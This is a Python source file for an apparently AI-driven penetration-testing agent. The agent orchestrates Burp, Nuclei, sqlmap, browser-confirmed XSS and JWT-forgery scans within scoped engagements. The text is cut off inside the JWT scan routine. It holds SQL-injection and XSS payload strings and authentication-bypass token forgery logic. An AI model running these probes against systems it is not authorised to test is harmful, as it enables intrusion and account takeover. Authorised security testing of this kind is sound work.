"""
Vulnerability Analysis Agent
Specialized agent for vulnerability scanning, correlation, and validation.
"""

import asyncio
import json
import uuid
from datetime import datetime
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qsl, quote, urlencode, urlparse, urlunparse

import httpx
import structlog

logger = structlog.get_logger(__name__)

from ai_osop.adapters.browser_mcp import BrowserMCPAdapter
from ai_osop.adapters.burp_mcp import BurpMCPAdapter
from ai_osop.adapters.oast_mcp import OASTAdapter
from ai_osop.adapters.security_bridge_mcp import SecurityBridgeAdapter
from ai_osop.adapters.turbo_intruder_mcp import TurboIntruderMCPAdapter
from ai_osop.agents.base import AgentContext, BaseAgent
from ai_osop.auth.session_store import SessionStore
from ai_osop.core.config import NUCLEI_SCAN_PROFILES, AgentType, Severity, VulnClass, settings
from ai_osop.core.exceptions import AgentException
from ai_osop.core.models import Asset, Endpoint, Task, Vulnerability
from ai_osop.core.oast_correlation import OASTCorrelationRegistry, OASTProbe


class VulnAnalysisAgent(BaseAgent):
    """
    Vulnerability Analysis Agent

    Responsibilities:
    - Burp Suite scanning and analysis
    - Nuclei template execution
    - Manual request analysis
    - False positive triage
    - Vulnerability classification and severity assignment
    """

    @property
    def agent_type(self) -> AgentType:
        return AgentType.VULN_ANALYSIS

    async def _setup_resources(self) -> None:
        """Initialize vulnerability scanning tools."""
        self.burp_adapter = BurpMCPAdapter(self.ctx.mcp_registry)
        # security-bridge drives the real offensive CLI tools (sqlmap/nmap/ffuf).
        # Owning it here is what wires sqlmap into an executable agent task (sqli_scan).
        self.security_bridge = SecurityBridgeAdapter(self.ctx.mcp_registry)
        # browser-mcp (Playwright) lets xss_scan CONFIRM execution (a payload that
        # actually runs in the DOM) rather than settle for a template/reflection match.
        self.browser_adapter = BrowserMCPAdapter(self.ctx.mcp_registry)
        # oast-mcp lets ssrf_scan CONFIRM blind SSRF via a real out-of-band callback,
        # not a guess. No callback => no finding.
        self.oast = OASTAdapter(self.ctx.mcp_registry)
        # Slow-path reconciler entry point: promotes blind callbacks that land
        # after a scan's inline poll window closed (see core.oast_correlation).
        self.oast_correlation = OASTCorrelationRegistry(self.oast)
        # turbo-intruder (real raw-socket single-packet) drives race_limit_scan —
        # confirm TOCTOU/double-spend when a once-only action succeeds more than once.
        self.turbo = TurboIntruderMCPAdapter(self.ctx.mcp_registry)
        # Phase 1 Bug Bounty Upgrade: authenticated session store so probes can run
        # as an imported user (User A vs User B authz testing) instead of anonymously.
        self.session_store = SessionStore(self.ctx.session_memory)
        self.findings: Dict[str, Vulnerability] = {}
        self.false_positive_patterns: List[str] = []

    def session_client(self, engagement_id: str, user_label: str):
        """Return an auth-aware SessionClient context manager for a stored user.

        All agents consume credentials through this single abstraction — no agent
        hand-injects cookies or bearer tokens. Usage:

            async with self.session_client(engagement_id, "user_a") as client:
                resp = await client.get(url)

        Cookie mutations from Set-Cookie are auto-persisted on context exit.
        """
        return self.session_store.as_user(engagement_id, user_label)

    async def _has_session(self, engagement_id: str, user_label: str) -> bool:
        """True if an imported (and non-expired) user session exists for replay."""
        try:
            sess = await self.session_store.get_session_or_none(engagement_id, user_label)
        except Exception:
            return False
        return sess is not None and not sess.is_expired()

    async def think(self, context: str, skill_names: List[str]) -> str:
        """Reason about the current context using specialized skills."""
        skills_content = "\n\n".join([self._load_skill(s) for s in skill_names])

        messages = [
            {
                "role": "system",
                "content": f"You are an AI Offensive Security Agent. Use the following specialized skills to perform your analysis:\n\n{skills_content}",
            },
            {"role": "user", "content": context},
        ]

        return await self.ctx.llm_client.complete(messages)

    async def _execute(self, task: Task) -> Dict[str, Any]:
        """Execute vulnerability analysis task."""
        task_type = task.type
        payload = task.payload
        # PATCH (REL-016, 2026-06-15): inject engagement_id into payload so
        # downstream helpers don't depend on self.ctx.current_task (which can
        # race to None when retries fire concurrently — see BaseAgent.handle_task
        # finally block + asyncio.create_task(self._schedule_retry(...))).
        # Observed failures: "'NoneType' object has no attribute 'engagement_id'"
        # in burp_scan branch (vuln-agent had 5 of these in eng-...verify).
        if isinstance(payload, dict) and not payload.get("engagement_id"):
            payload["engagement_id"] = task.engagement_id

        if task_type == "burp_scan":
            return await self._execute_burp_scan(payload)
        elif task_type == "intruder_fuzz":
            return await self._execute_intruder_fuzz(payload)
        elif task_type == "nuclei_scan":
            return await self._execute_nuclei_scan(payload)
        elif task_type == "sqli_scan":
            return await self._execute_sqli_scan(payload)
        elif task_type == "xss_scan":
            return await self._execute_xss_scan(payload)
        elif task_type == "jwt_scan":
            return await self._execute_jwt_scan(payload)
        elif task_type == "mass_assignment_scan":
            return await self._execute_mass_assignment_scan(payload)
        elif task_type == "csrf_scan":
            return await self._execute_csrf_scan(payload)
        elif task_type == "ssrf_scan":
            return await self._execute_ssrf_scan(payload)
        elif task_type == "stored_xss_scan":
            return await self._execute_stored_xss_scan(payload)
        elif task_type == "subdomain_takeover_scan":
            return await self._execute_subdomain_takeover_scan(payload)
        elif task_type == "secret_liveness_scan":
            return await self._execute_secret_liveness_scan(payload)
        elif task_type == "file_upload_scan":
            return await self._execute_file_upload_scan(payload)
        elif task_type == "prototype_pollution_scan":
            return await self._execute_prototype_pollution_scan(payload)
        elif task_type == "websocket_scan":
            return await self._execute_websocket_scan(payload)
        elif task_type == "saml_scan":
            return await self._execute_saml_scan(payload)
        elif task_type == "race_limit_scan":
            return await self._execute_race_limit_scan(payload)
        elif task_type == "ssrf_metadata_chain":
            return await self._execute_ssrf_metadata_chain(payload)
        elif task_type == "request_smuggling_scan":
            return await self._execute_request_smuggling_scan(payload)
        elif task_type == "correlate_findings":
            return await self._execute_correlation(payload)
        elif task_type == "triage_finding":
            return await self._execute_triage(payload)
        else:
            raise AgentException(f"Unknown vuln analysis task: {task_type}")

    async def _enrich_with_prior_findings(self, context: str, domain: str) -> str:
        """Append semantically-similar past findings to a reasoning context.

        P2 learning brain: gives the LLM reasoning step attack patterns confirmed
        in earlier engagements. Best-effort — returns the context unchanged if the
        knowledge base is absent or recall fails (recall_prior_findings never
        raises, but we guard defensively).
        """
        try:
            prior = await self.recall_prior_findings(context, limit=3, min_score=0.35)
        except Exception as e:  # noqa: BLE001 - recall is advisory, never fatal
            logger.warning("vuln_agent_recall_failed", domain=domain, error=str(e))
            return context
        if not prior:
            return context
        prior_lines = "\n".join(
            f"- [{h.metadata.get('severity', '?')}] {h.metadata.get('vuln_type', '?')}: "
            f"{h.metadata.get('title', '')} (similarity {round(h.score, 2)})"
            for h in prior
        )
        logger.info("vuln_agent_recalled_prior_findings", domain=domain, count=len(prior))
        return (
            context + "\n\nPrior similar findings from past engagements "
            "(consider these attack patterns first):\n" + prior_lines
        )

    async def _execute_burp_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Execute Burp Suite scan on target."""
        # PATCH (REL-010, 2026-06-15): Task scheduler sometimes emits
        # `target`/`target_url` instead of `url` (observed in eng-...verify
        # tasks task-f2948e789933, task-7f00a78fd92a). Accept any of the three
        # to avoid silent KeyError -> "Task failed after 3 retries: 'url'".
        url = payload.get("url") or payload.get("target_url") or payload.get("target")
        if not url:
            raise AgentException(
                "burp_scan task requires one of 'url', 'target_url', or 'target' in payload"
            )
        # PATCH (REL-016): pull engagement_id from payload (injected by _execute)
        # rather than self.ctx.current_task (race-prone on retries).
        engagement_id = payload.get("engagement_id") or (
            self.ctx.current_task.engagement_id if self.ctx.current_task else None
        )
        if not engagement_id:
            raise AgentException("burp_scan: cannot determine engagement_id")
        domain = url.replace("https://", "").replace("http://", "").split("/")[0]
        config = payload.get("config", {})

        # Ensure base Asset exists for graph linking
        asset = Asset(
            id=f"asset-{engagement_id}-{domain}",
            type="domain",
            value=domain,
            source="manual_input",
            confidence=1.0,
            first_seen=datetime.utcnow(),
            last_seen=datetime.utcnow(),
            engagement_id=engagement_id,
            metadata={},
        )
        # Note: metadata might cause issues if Neo4j expects primitives,
        # but let's ensure we match the pydantic requirements first.
        await self.ctx.graph_memory.add_asset(asset)

        # Ensure default Endpoint node exists for f"endpoint-{domain}"
        from ai_osop.core.models import Endpoint

        default_ep = Endpoint(
            id=f"endpoint-{engagement_id}-{domain}",
            url=f"https://{domain}/",
            asset_id=asset.id,
            source="scan_base",
            confidence=1.0,
            engagement_id=engagement_id,
        )
        await self.ctx.graph_memory.add_endpoint(default_ep)

        # Ensure adapter is initialized for this engagement
        session = await self.ctx.session_memory.get_session_state(engagement_id)
        if session:
            await self.burp_adapter.initialize(session.scope, session.session_id)

        # Launch Burp scan. AIOSOP-BURP-DEGRADE-001 (2026-07-03): the active scanner
        # (Scanner.startAudit) requires Burp Suite Professional; on Community/unlicensed
        # it raises — surfaced with the real Java cause by _check_response since
        # AIOSOP-BURP-ERR-001. That must NOT fail the whole task and poison the DLQ:
        # the sitemap / proxy-history / already-recorded issues gathered below come from
        # the proxy layer (present in every Burp edition) and are still worth keeping.
        # So we degrade — record the real reason in burp_error (returned in the result),
        # log it, and continue. The task completes with whatever passive data exists.
        from ai_osop.core.exceptions import MCPException

        burp_error = None
        try:
            scan_result = await self.burp_adapter.scan_target(url, config)
            if scan_result.status != "success":
                burp_error = scan_result.error
                logger.warning("Burp scan failed to start: %s", burp_error)
        except MCPException as e:
            burp_error = str(e)
            logger.warning("burp_scan_degraded_active_scan_unavailable", error=burp_error)

        # Retrieve and normalize findings
        logger.debug("Requesting issues, sitemap, and proxy history for %s", url)
        vulns = await self.burp_adapter.get_scan_issues(url)

        endpoints = await self.burp_adapter.get_sitemap(url_prefix=domain)
        history = await self.burp_adapter.get_proxy_history()

        logger.info(
            "burp_scan_results",
            issues=len(vulns),
            sitemap_entries=len(endpoints),
            history_entries=len(history),
        )

        # Combine endpoints from sitemap and history
        all_endpoints = {ep.url: ep for ep in endpoints}
        for entry in history:
            url = entry.get("url", "")
            if domain in url and url not in all_endpoints:
                all_endpoints[url] = Endpoint(
                    url=url,
                    method=entry.get("method", "GET"),
                    status_code=entry.get("status_code", 0),
                    host=entry.get("host", domain),
                    asset_id=asset.id,
                    source="burp_proxy",
                    confidence=1.0,
                    engagement_id=engagement_id,
                )

        logger.debug(f"Total unique endpoints for {domain}: {len(all_endpoints)}")

        # PATCH (REL-035, 2026-06-15): Persist findings + endpoints FIRST.
        # Pre-patch order was: reasoning (Ollama, often 60–1800s) → persist.
        # If the LLM hit the 300s task timeout, vulnerabilities were never
        # written to the graph. Now we persist immediately so partial results
        # survive any downstream timeout. Reasoning is best-effort with its
        # own short ceiling.
        for vuln in vulns:
            try:
                vuln.engagement_id = engagement_id
                vuln.endpoint_id = f"endpoint-{domain}"
                await self.ctx.graph_memory.add_vulnerability(vuln)
                self.findings[vuln.id] = vuln
            except Exception as e:
                logger.error(f"Failed to add vulnerability {vuln.id} to graph: {e}")

        for ep in all_endpoints.values():
            try:
                ep.engagement_id = engagement_id
                ep.asset_id = asset.id
                await self.ctx.graph_memory.add_endpoint(ep)
            except Exception as e:
                logger.error(f"Failed to add endpoint {ep.url} to graph: {e}")

        # Perform reasoning using security skills (best-effort, never blocks
        # finding persistence; bounded by a short timeout so vuln_agent fits
        # inside its 300s task budget even when Ollama is slow).
        analysis_context = f"Target {domain} identified. Initializing vulnerability analysis phase."
        if all_endpoints:
            analysis_context = (
                f"Analyzing {len(all_endpoints)} new endpoints for {domain} to identify potential vulnerabilities:\n"
                + "\n".join([e.url for e in list(all_endpoints.values())[:10]])
            )

        # P2 learning brain: consult semantically-similar findings from past
        # engagements and surface them to the reasoning step, so the agent
        # benefits from attack patterns that were confirmed before.
        analysis_context = await self._enrich_with_prior_findings(analysis_context, domain)

        reasoning = "(reasoning skipped: not attempted)"
        try:
            skills = await self._get_relevant_skills(self.ctx.current_task)
            reasoning_timeout = float(payload.get("reasoning_timeout_seconds", 45))
            reasoning = await asyncio.wait_for(
                self.think(analysis_context, skills),
                timeout=reasoning_timeout,
            )
            reasoning = f"[VERIFIED_V0.1.2] {reasoning}"
        except asyncio.TimeoutError:
            reasoning = f"(reasoning skipped: exceeded {reasoning_timeout}s budget)"
            logger.warning(
                "vuln_agent_reasoning_timeout",
                domain=domain,
                message="findings persisted anyway",
            )
        except Exception as e:
            reasoning = f"(reasoning skipped: {type(e).__name__}: {str(e)[:120]})"
            logger.warning("vuln_agent_reasoning_error", domain=domain, error=str(e))
        logger.info(f"AGENT REASONING: {reasoning}")

        return {
            "status": "success",
            "tool": "burp_scanner",
            "target": url,
            "findings_count": len(vulns),
            "endpoints_count": len(all_endpoints),
            "reasoning": reasoning,
            "burp_error": burp_error,
            "findings": [v.model_dump() for v in vulns],
        }

    async def _execute_intruder_fuzz(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Orchestrate Burp Intruder for payload fuzzing."""
        url = payload.get("url")
        method = payload.get("method", "GET")
        body = payload.get("body", "")
        payload_set = payload.get(
            "payload_set", ["' OR 1=1 --", "admin'--", "<script>alert(1)</script>"]
        )
        tab_name = payload.get("tab_name", f"AI-FUZZ-{int(datetime.utcnow().timestamp())}")

        logger.debug(f"Deploying Intruder attack against {url}")

        # Prepare the base request definition expected by our Java MCP adapter
        mock_request = {
            "method": method,
            "url": url,
            "headers": {"User-Agent": "AI-OSOP-Intruder/1.0"},
            "body": body,
        }

        # The actual integration would pass positions, but for the MCP adapter
        # we mapped it to just take the request for now.
        try:
            # We use extension_call or direct mapping based on Java implementation.
            # Given our Java update mapped "intruder_attack":
            response = await self.burp_adapter.intruder_attack(
                request=mock_request,
                payload_positions=[],  # Handled dynamically by Burp in Sniper mode if empty
                payload_set=payload_set,
                config={"attack_type": "sniper", "tab_name": tab_name},
            )

            # Simulated reasoning over Intruder decision
            reasoning = f"[INTRUDER_DEPLOYED] Dispatched Sniper attack to {url} with {len(payload_set)} payloads targeting dynamic parameters."

            return {
                "status": "success",
                "target": url,
                "tab_name": tab_name,
                "reasoning": reasoning,
                "mcp_response": (
                    response.model_dump() if hasattr(response, "model_dump") else str(response)
                ),
            }

        except Exception as e:
            return {"status": "error", "error": str(e)}

    async def _execute_nuclei_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Execute Nuclei scan on targets."""
        # PATCH (REL-015/REL-016, 2026-06-15): be forgiving on payload shape.
        # Observed runtime failures: KeyError 'targets' (when scheduler used
        # `target`/`url` instead), and "'str' object has no attribute 'get'"
        # when callers passed a single URL string rather than a list.
        targets = payload.get("targets")
        if targets is None:
            single = payload.get("target") or payload.get("url") or payload.get("target_url")
            if single:
                targets = [single]
        if not targets:
            raise AgentException(
                "nuclei_scan task requires 'targets' (list) or 'target'/'url' in payload"
            )
        if isinstance(targets, str):
            targets = [targets]
        templates = payload.get("templates", [])
        severity = payload.get("severity", "")  # e.g. "critical,high,medium"
        tags = payload.get("tags", "")
        # Scan profile (Sprint 0): when the caller supplies NO template/severity/tag
        # scoping, nuclei would run the full ~13k-template set and overrun the task
        # timeout (the NUCLEI-FANOUT failure — observed live: 300s timeout, 3 retries,
        # 0 findings, orphaned subprocesses). Apply a bounded profile so interactive
        # scans finish within budget. profile="deep" (or explicit filters) opts back
        # into exhaustive coverage.
        if not templates and not severity and not tags:
            profile = str(payload.get("profile") or "fast").lower()
            prof = NUCLEI_SCAN_PROFILES.get(profile, NUCLEI_SCAN_PROFILES["fast"])
            severity = prof.get("severity", "")
            tags = prof.get("tags", "")
            logger.info(
                "nuclei_scan_profile_applied", profile=profile, severity=severity, tags=tags
            )
        engagement_id = payload.get("engagement_id") or (
            self.ctx.current_task.engagement_id if self.ctx.current_task else None
        )

        # Execute via MCP. Forward severity/tags so the orchestrator's high-signal
        # scoping (AIOSOP-NUCLEI-TIMEOUT-2026-06-24) actually reaches nuclei and the
        # scan completes within budget instead of running the full template set.
        scan_params = {"targets": targets, "templates": templates, "rate_limit": 150}
        if severity:
            scan_params["severity"] = severity
        if tags:
            scan_params["tags"] = tags
        response = await self.ctx.mcp_registry.execute_tool(
            "nuclei-mcp",
            "scan",
            scan_params,
            timeout_override=settings.nuclei_mcp_timeout,
        )

        if response.status != "success":
            return {"status": "error", "error": response.error}

        # Normalize Nuclei findings
        raw_findings = response.result.get("findings", [])
        vulns = []

        # FP triage (AIOSOP-FP-CATCHALL-001): probe the host ONCE for catch-all /
        # wildcard behavior (returns 2xx with a real body for random non-existent
        # paths). On such hosts nuclei status/word matchers fire on the generic
        # catch-all page and yield false positives (e.g. a "default-login" template
        # 'succeeding' against a marketing SPA). Detected here so matches can be
        # down-ranked BEFORE they are persisted or reach the exploitation gate.
        catch_all = await self._detect_catch_all(targets[0]) if targets else {"is_catch_all": False}
        if catch_all.get("is_catch_all"):
            logger.warning(
                "catch_all_host_detected",
                target=targets[0],
                baseline_status=catch_all.get("baseline_status"),
                baseline_len=catch_all.get("baseline_len"),
            )

        for finding in raw_findings:
            # nuclei-mcp emits each finding as a JSONL string (one JSON object per
            # line from `nuclei -jsonl`). Parse strings into dicts before
            # normalizing. Previously these were silently skipped (REL-015), which
            # dropped every real finding and reported findings_count=0.
            if isinstance(finding, str):
                try:
                    finding = json.loads(finding)
                except (json.JSONDecodeError, ValueError) as e:
                    logger.warning(f"skipping unparseable nuclei finding: {e}")
                    continue
            if not isinstance(finding, dict):
                logger.warning(f"skipping non-dict nuclei finding: {finding!r}")
                continue
            vuln = self._normalize_nuclei_finding(finding)
            if catch_all.get("is_catch_all"):
                self._apply_catch_all_fp_downrank(vuln, catch_all)
            if engagement_id:
                vuln.engagement_id = engagement_id
            await self.ctx.graph_memory.add_vulnerability(vuln)
            self.findings[vuln.id] = vuln
            vulns.append(vuln)

        fp_count = sum(1 for v in vulns if getattr(v, "confidence", 1.0) <= 0.25)
        if fp_count:
            logger.info(
                "nuclei_fp_downranked",
                target=targets[0] if targets else None,
                likely_false_positives=fp_count,
                total=len(vulns),
            )

        return {
            "status": "success",
            "tool": "nuclei",
            "targets": targets,
            "findings_count": len(vulns),
            "catch_all_host": bool(catch_all.get("is_catch_all")),
            "likely_false_positives": fp_count,
            "findings": [v.model_dump() for v in vulns],
        }

    async def _execute_sqli_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Run sqlmap against a target and mint a CONFIRMED finding on real injection.

        Unlike nuclei (template match -> POTENTIAL), sqlmap *demonstrates* the
        injection (boolean/error/UNION/time payloads that actually succeed), so a
        positive verdict is a validated proof of concept -> Vulnerability(validated=True).

        Payload:
            url           target URL (GET params injectable as-is, e.g. ...?q=test)
            data          optional whitespace-free POST body (e.g. "email=a&pass=b")
            level / risk   sqlmap detection depth (1-5) / risk (1-3); default 1/1
            engagement_id  injected by _execute
        """
        url = payload.get("url") or payload.get("target_url") or payload.get("target")
        if not url:
            raise AgentException(
                "sqli_scan task requires one of 'url', 'target_url', or 'target' in payload"
            )
        engagement_id = payload.get("engagement_id") or (
            self.ctx.current_task.engagement_id if self.ctx.current_task else None
        )
        if not engagement_id:
            raise AgentException("sqli_scan: cannot determine engagement_id")

        data = payload.get("data")
        level = int(payload.get("level", 1))
        risk = int(payload.get("risk", 1))

        # Initialize the bridge for this engagement so scope enforcement applies.
        session = await self.ctx.session_memory.get_session_state(engagement_id)
        if session:
            await self.security_bridge.initialize(session.scope, session.session_id)

        try:
            verdict = await self.security_bridge.run_sqlmap(url, data=data, level=level, risk=risk)
        except Exception as e:  # MCPException etc. — report, do not crash the agent
            logger.warning("sqli_scan_failed", url=url, error=str(e))
            return {"status": "error", "tool": "sqlmap", "target": url, "error": str(e)}

        injectable = bool(verdict.get("injectable"))
        if not injectable:
            logger.info("sqli_scan_clean", url=url, level=level, risk=risk)
            return {
                "status": "success",
                "tool": "sqlmap",
                "target": url,
                "injectable": False,
                "findings_count": 0,
            }

        # Confirmed injection -> validated CONFIRMED finding.
        parameter = verdict.get("parameter", "")
        dbms = verdict.get("dbms", "")
        techniques = verdict.get("techniques", []) or []
        payloads = verdict.get("payloads", []) or []

        vuln = Vulnerability(
            cwe="CWE-89",
            vuln_type=VulnClass.SQLI,
            severity=Severity.CRITICAL,
            title=f"SQL Injection in parameter '{parameter or 'unknown'}'",
            description=(
                f"sqlmap confirmed a SQL injection at {url} "
                f"(parameter: {parameter or 'n/a'}; back-end DBMS: {dbms or 'unknown'}). "
                f"Techniques: {', '.join(techniques) if techniques else 'n/a'}."
            ),
            evidence=[
                {
                    "type": "sqlmap_injection",
                    "provenance": "sqlmap",
                    "url": url,
                    "parameter": parameter,
                    "dbms": dbms,
                    "techniques": techniques,
                    "payloads": payloads,
                }
            ],
            tool_source="sqlmap",
            confidence=0.98,
            validated=True,
            exploitability="high",
            impact="high",
            engagement_id=engagement_id,
        )
        try:
            await self.ctx.graph_memory.add_vulnerability(vuln)
            self.findings[vuln.id] = vuln
        except Exception as e:
            logger.error("sqli_scan_persist_failed", vuln_id=vuln.id, error=str(e))

        logger.info(
            "sqli_scan_confirmed",
            url=url,
            parameter=parameter,
            dbms=dbms,
            techniques=len(techniques),
        )
        return {
            "status": "success",
            "tool": "sqlmap",
            "target": url,
            "injectable": True,
            "findings_count": 1,
            "findings": [vuln.model_dump()],
        }

    @staticmethod
    def _inject_payload(url: str, payload: str, param: Optional[str] = None) -> str:
        """Return ``url`` with ``payload`` placed into a query parameter.

        Handles three shapes: an explicit ``OSOPINJECT`` placeholder, a normal
        ``?a=b`` query string, and SPA hash-routes whose query lives in the
        fragment (e.g. ``/#/search?q=test`` — how Juice Shop's DOM-XSS sink is
        reached). When no param is named the last existing one is fuzzed, else 'q'.
        """
        if "OSOPINJECT" in url:
            return url.replace("OSOPINJECT", quote(payload, safe=""))

        parsed = urlparse(url)
        # SPA hash route carrying its own query string.
        if parsed.fragment and "?" in parsed.fragment:
            frag_path, frag_q = parsed.fragment.split("?", 1)
            q = dict(parse_qsl(frag_q, keep_blank_values=True))
            target = param or (list(q)[-1] if q else "q")
            q[target] = payload
            new_frag = frag_path + "?" + urlencode(q, quote_via=quote)
            return urlunparse(parsed._replace(fragment=new_frag))

        q = dict(parse_qsl(parsed.query, keep_blank_values=True))
        target = param or (list(q)[-1] if q else "q")
        q[target] = payload
        return urlunparse(parsed._replace(query=urlencode(q, quote_via=quote)))

    async def _confirm_xss_execution(self, url: str, token: str, engagement_id: str) -> bool:
        """Navigate a real browser to ``url`` and confirm the payload EXECUTED.

        The payload sets ``window.__osopxss`` to a per-scan token via an <img onerror>
        handler (fires even through innerHTML sinks). We then eval that global: a
        match proves the injected JavaScript actually ran — true execution, not a
        reflection or template guess. Fresh token per scan avoids stale positives.
        """
        try:
            await self.browser_adapter.navigate(
                url, user_label="guest", engagement_id=engagement_id
            )
            res = await self.browser_adapter.execute_action(
                "eval",
                {"expression": "window.__osopxss || null"},
                user_label="guest",
                engagement_id=engagement_id,
            )
        except Exception as e:
            logger.warning("xss_execution_probe_failed", url=url, error=str(e))
            return False
        return (res or {}).get("result") == token

    async def _confirm_xss_reflection(self, url: str, marker: str) -> bool:
        """Confirm a server-reflected XSS: the raw, un-encoded marker tag appears
        verbatim in the HTTP response body (i.e. the app did not entity-encode it).
        Catches classic reflected XSS that never reaches a browser sink."""
        try:
            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=20) as client:
                resp = await client.get(url)
                body = resp.text
        except Exception as e:
            logger.warning("xss_reflection_probe_failed", url=url, error=str(e))
            return False
        # Raw marker present but its HTML-encoded form absent => un-sanitized echo.
        return marker in body and marker.replace("<", "&lt;") not in body

    async def _execute_xss_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Confirm XSS by ACTUAL EXECUTION (headless browser) and/or raw reflection,
        never by template match. A validated finding is minted only when a payload
        runs in the DOM or is echoed un-encoded into an executable context.

        Payload:
            url            target (supports ?a=b and SPA '#/path?q=' routes, or an
                           explicit 'OSOPINJECT' placeholder)
            param          optional parameter name to inject into
            engagement_id  injected by _execute
        """
        url = payload.get("url") or payload.get("target_url") or payload.get("target")
        if not url:
            raise AgentException(
                "xss_scan task requires one of 'url', 'target_url', or 'target' in payload"
            )
        engagement_id = payload.get("engagement_id") or (
            self.ctx.current_task.engagement_id if self.ctx.current_task else None
        )
        if not engagement_id:
            raise AgentException("xss_scan: cannot determine engagement_id")
        param = payload.get("param")

        # Initialize the browser connection for this engagement (scope enforcement).
        session = await self.ctx.session_memory.get_session_state(engagement_id)
        if session:
            # Best-effort: a browser-mcp init stall (e.g. Chromium launch under load) must
            # not sink the whole scan. If it fails, the execution probe simply no-ops and we
            # still run the browser-free reflection probe. (AIOSOP-MCP-TIMEOUT-001)
            try:
                await self.browser_adapter.initialize(session.scope, session.session_id)
            except Exception as e:
                logger.warning("xss_browser_init_failed", url=url, error=str(e))

        token = f"OSOPXSS{uuid.uuid4().hex[:10]}"

        # 1) Execution probe (DOM + reflected sinks): <img onerror> sets a global.
        exec_payload = f"<img src=x onerror=\"window.__osopxss='{token}'\">"
        exec_url = self._inject_payload(url, exec_payload, param)
        executed = await self._confirm_xss_execution(exec_url, token, engagement_id)

        # 2) Reflection probe (server-reflected): raw marker tag echoed un-encoded.
        reflected = False
        refl_url = exec_url
        if not executed:
            marker = f"<{token}>"
            refl_url = self._inject_payload(url, marker, param)
            reflected = await self._confirm_xss_reflection(refl_url, marker)

        if not (executed or reflected):
            logger.info("xss_scan_clean", url=url, param=param)
            return {
                "status": "success",
                "tool": "xss_scan",
                "target": url,
                "confirmed": False,
                "findings_count": 0,
            }

        method = "execution" if executed else "reflection"
        proof_url = exec_url if executed else refl_url
        # Only real browser EXECUTION is a validated XSS. Un-encoded reflection is a
        # strong lead but not proof — the context may not execute (attribute/text node,
        # CSP, WAF, framework auto-escaping downstream), and a triager will reject
        # "reflected != executed". So reflection-only is a manual-confirm MEDIUM lead.
        if executed:
            severity, confidence, validated, manual_confirm = Severity.HIGH, 0.97, True, False
        else:
            severity, confidence, validated, manual_confirm = Severity.MEDIUM, 0.5, False, True
        vuln = Vulnerability(
            cwe="CWE-79",
            vuln_type=VulnClass.XSS,
            severity=severity,
            title=f"Cross-Site Scripting ({'confirmed via execution' if executed else 'reflected — needs execution proof'})",
            description=(
                f"A Cross-Site Scripting payload was confirmed at {url} "
                f"(parameter: {param or 'auto'}). Confirmation method: {method} — "
                + (
                    "the injected JavaScript actually executed in a real browser DOM."
                    if executed
                    else "the payload was reflected un-encoded into the HTTP response, but "
                    "execution was NOT observed in a browser — confirm the injection context "
                    "executes before submitting."
                )
            ),
            evidence=[
                {
                    "type": "xss_confirmation",
                    "provenance": "browser" if executed else "http_reflection",
                    "method": method,
                    "url": url,
                    "proof_url": proof_url,
                    "parameter": param or "auto",
                    "token": token,
                    "manual_confirm_required": manual_confirm,
                }
            ],
            tool_source="xss_scan",
            confidence=confidence,
            validated=validated,
            exploitability="high",
            impact="medium",
            engagement_id=engagement_id,
        )
        try:
            await self.ctx.graph_memory.add_vulnerability(vuln)
            self.findings[vuln.id] = vuln
        except Exception as e:
            logger.error("xss_scan_persist_failed", vuln_id=vuln.id, error=str(e))

        logger.info("xss_scan_confirmed", url=url, method=method, param=param)
        return {
            "status": "success",
            "tool": "xss_scan",
            "target": url,
            "confirmed": True,
            "method": method,
            "manual_confirm_required": manual_confirm,
            "findings_count": 1,
            "findings": [vuln.model_dump()],
        }

    async def _execute_jwt_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Forge JWTs and confirm acceptance against a real identity endpoint.

        Each confirmed technique (alg:none / weak secret / kid injection) is an
        authentication bypass -> a validated Vulnerability(JWT_ABUSE). A token is
        required: pass one explicitly, or store a 'user_a' session whose metadata
        carries a bearer token.

        Payload:
            verify_url     identity-reflecting endpoint (e.g. /rest/user/whoami)
            token          a valid JWT to mutate (optional if a session has one)
            sentinel       forged identity to detect (default attacker sentinel)
            method         HTTP method for verify_url (default GET)
            public_key_pem optional RSA public key for RS256->HS256 confusion test
            engagement_id  injected by _execute
        """
        verify_url = payload.get("verify_url") or payload.get("url")
        if not verify_url:
            raise AgentException("jwt_scan requires 'verify_url' (an identity-reflecting endpoint)")
        engagement_id = payload.get("engagement_id") or (
            self.ctx.current_task.engagement_id if self.ctx.current_task else None
        )
        if not engagement_id:
            raise AgentException("jwt_scan: cannot determine engagement_id")

        token = payload.get("token")
        if not token:
            token = await self._token_from_session(
                engagement_id, payload.get("user_label", "user_a")
            )
        if not token:
            return {
                "status": "error",
                "tool": "jwt_scan",
                "error": "no JWT available (pass 'token' or store a session with a bearer token)",
            }

        from ai_osop.core.jwt_tester import JWTTester

        tester = JWTTester(
            verify_url,
            token,
            sentinel=payload.get("sentinel", "osop-forged@attacker.test"),
            method=payload.get("method", "GET"),
            extra_secrets=payload.get("extra_secrets"),
            public_key_pem=payload.get("public_key_pem"),
        )
        try:
            jwt_findings = await tester.run()
        except Exception as e:
            logger.warning("jwt_scan_failed", verify_url=verify_url, error=str(e))
            return {"status": "error", "tool": "jwt_scan", "error": str(e)}

        confirmed = [f for f in jwt_findings if f.confirmed]
        minted = []
        for f in confirmed:
            vuln = Vulnerability(
                cwe="CWE-347",  # Improper Verification of Cryptographic Signature
                vuln_type=VulnClass.JWT_ABUSE,
                severity=Severity.CRITICAL,
                title=f"JWT authentication bypass ({f.technique})",
                description=(
                    f"{f.detail} Endpoint: {verify_url}. The forged token was accepted "
                    f"and the chosen identity ('{f.sentinel}') was reflected back."
                ),
                evidence=[
                    {
                        "type": "jwt_forgery",
                        "provenance": "jwt_tester",
                        "technique": f.technique,
                        "verify_url": verify_url,
                        "secret": f.secret,
                        "kid": f.kid,
                        "sentinel": f.sentinel,
                        **f.evidence,
                    }
                ],
                tool_source="jwt_tester",
                confidence=0.98,
                validated=True,
                exploitability="high",
                impact="high",
                engagement_id=engagement_id,
            )
            try:
                await self.ctx.graph_memory.add_vulnerability(vuln)
                self.findings[vuln.id] = vuln
                minted.append(vuln)
            except Exception as e:
